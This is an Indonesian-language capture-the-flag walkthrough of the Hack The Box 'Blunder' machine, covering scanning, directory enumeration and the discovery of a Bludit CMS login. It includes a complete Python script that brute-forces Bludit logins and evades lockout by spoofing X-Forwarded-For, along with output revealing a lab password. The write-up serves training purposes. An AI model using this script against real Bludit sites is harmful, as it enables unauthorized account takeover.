---
description: '{"Level" : "Easy" , "OS" : "Linux" , "IP_Address" : "10.10.10.191"}'
---

# Blunder

## Deskripsi Mesin

Mesin blunder ini merupakan mesin dengan sistem operasi linux dan tingkat kesulitan easy pada hackthebox. mesin dirilis oleh [egotisticalSW](https://www.hackthebox.eu/home/users/profile/94858).

## Scanning Nmap

```text
nmap -sV 10.10.10.191
```

![Scanning Nmap](../.gitbook/assets/image%20%2834%29.png)

## Enumerasi port 80 \(Web Aplikasi\)

![http://10.10.10.191/](../.gitbook/assets/image%20%2832%29.png)

Dari tampilan web aplikasi tersebut sebenarnya tidak ada pemrosesan data apapun. tapi karena web aplikasi tersebut menampilkan beberapa nama character. kita catat saja dulu nama nama yang tercantum pada tampilan web tersebut. lalu ? karena web aplikasi nya hanya statis dan tidak memproses data apapun. selanjutnya saya mencoba melakukan enumerasi direktori / file yang mungkin memiliki penjelasan lebih detail terhadap web aplikasi tersebut.

Seperti biasa, saya melakukan direktori bruteforcing menggunakan ffuf.

```text
ffuf -u http://10.10.10.191/FUZZ -w /path/to/wordlist
```

![Direktori Bruteforce](../.gitbook/assets/image%20%2833%29.png)

Dari hasil bruteforce kita mendapatkan file `todo.txt`

```bash
#isi dari file todo.txt
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

Dari file todo.txt tersebut kita mendapati beberapa pesan tentang web aplikasi ini dan salah satu user dengan sebutan "fergus". siapa fergus !? yaudah kita simpan dulu saja informasinya. kemudian saya mencoba melakukan bruteforcing direktori lagi dengan wordlist yang berbeda.

![directory bruteforce](../.gitbook/assets/image%20%2829%29.png)

kita mendapati adanya direktory /admin/ dari hasil diatas. kemudian langsung saja saya mencoba mengakses directory tersebut dan langsung diredirect pada sebuah halaman /login dengan banner bertuliskan bludit.

![](../.gitbook/assets/image%20%2830%29.png)

Times to Googling & saya mendapati bahwa bludit adalah sebuah CMS open source. Dan..... Setelah itu saya mendapatkan informasi serta script untuk eksploitasi \( Authentication Bypass \) dari si cms bludit ini [disini](https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb)

## Initial Exploit

Sebelumnya kita mendapatkan user "fergus" dari file todo.txt. dan kita juga sudah mendapati informasi untuk melakukan authentication bypass dari artikel diatas. berikut adalah script python yang sudah saya modifikasi untuk keperluan mesin blunder ini.

```python
#!/usr/bin/env python3
import re
import requests

host = "http://10.10.10.191" # change to the appropriate URL

login_url = host + '/admin/login'
username = 'fergus' # Change to the appropriate username
fname = "/root/htb/blunder/wordlist.txt" #change this to the appropriate file you can specify the full path to the file
with open(fname) as f:
    content = f.readlines()
    word1 = [x.strip() for x in content] 
wordlist = word1

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

Untuk Menjalankan Script diatas, kita membutuhkan file wordlist.txt yang didalamnya merupakan password list yang sudah kita siapkan. saya menggunakan tools cewl yang sudah terinstall untuk men-generate password.

![generate wordlist using cewl](../.gitbook/assets/image%20%2828%29.png)

## Brute Forcing

Mungkin bagi kalian yang ga mau pake cewl untuk generate wordlist, kalian bisa saja menggunakan rockyou.txt yang biasanya digunakan sebagain global wordlist di dunia CTF. 

```cpp
 ⚡ root@kali/htb/blunder$ python exploit.py                                                                                                                                                                                    
[*] Trying: to                                                                                                                                                                                                                             
[*] Trying: the                                                                                                                                                                                                                            
[*] Trying: of                                                                                                                                                                                                                             
[*] Trying: Load                                                                                                                                                                                                                           
[*] Trying: Plugins                                                                                                                                                                                                                        
[*] Trying: and                                                                                                                                                                                                                            
[*] Trying: a                                                                                                                                                                                                                              
[*] Trying: for                                                                                                                                                                                                                            
[*] Trying: is                                                                                                                                                                                                                             
[*] Trying: Include                                                                                                                                                                                                                        
[..........................................
...........................................
[*] Trying: RolandDeschain
()
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

